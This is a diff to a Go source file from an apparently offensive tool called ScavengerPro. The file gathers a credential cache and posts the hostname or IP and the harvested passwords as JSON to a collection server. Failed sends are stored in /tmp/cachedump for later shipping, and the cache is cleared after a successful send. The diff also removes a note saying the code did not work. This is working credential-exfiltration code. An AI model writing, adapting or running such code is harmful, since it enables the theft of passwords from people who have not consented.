@@ -1,11 +1,9 @@
 // ship the credential cache to the server
-// disclaimer: this doesn't work
 // @author: degenerat3
 
 package main
 
 import (
-	//"fmt"
 	"ScavengerPro/client/cred_cache"
 	"bufio"
 	"bytes"
@@ -20,10 +18,10 @@ var serv = "127.0.0.1:5000" //IP of server
 // This function will extract info from CredCache object and ship it back
 // to the web server.  If the POST request fails, write the cache data to
 // a file in temp, so it can be shipped later
-func sendData(c cred_cache.CredCache) {
+func sendData(c *cred_cache.CredCache) {
 	path := "/tmp/cachedump"
-	h := c.Get_hostname()
-	creds := c.Get_entries()
+	ip := c.GetIP()
+	creds := c.GetEntries()
 	previousDump := fetchDump(path)
 	if previousDump != nil {
 		for _, c := range previousDump {
@@ -35,7 +33,7 @@ func sendData(c cred_cache.CredCache) {
 		credStr += cd + "\n"
 	}
 	url := "http://" + serv + "/scavpro" //turn ip into URL
-	jsonData := map[string]string{"hostname": h, "credentials": credStr}
+	jsonData := map[string]string{"IP": ip, "credentials": credStr}
 	jsonValue, _ := json.Marshal(jsonData)
 	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
 	if err != nil {
@@ -44,6 +42,7 @@ func sendData(c cred_cache.CredCache) {
 		dumpCache(creds, path)
 		return
 	}
+	c.ClearEntries() // reset credential entries in cache
 
 }
 
@@ -79,8 +78,8 @@ func fetchDump(path string) []string {
 
 // This function will be called by other programs, checks to see if we have
 // enough entries to bother shipping them
-func shipIt(c cred_cache.CredCache, min int) {
-	if c.Count_entries() < min {
+func shipIt(c *cred_cache.CredCache, min int) {
+	if c.CountEntries() < min {
 		return // not enough passwords to ship
 	}
 	sendData(c)
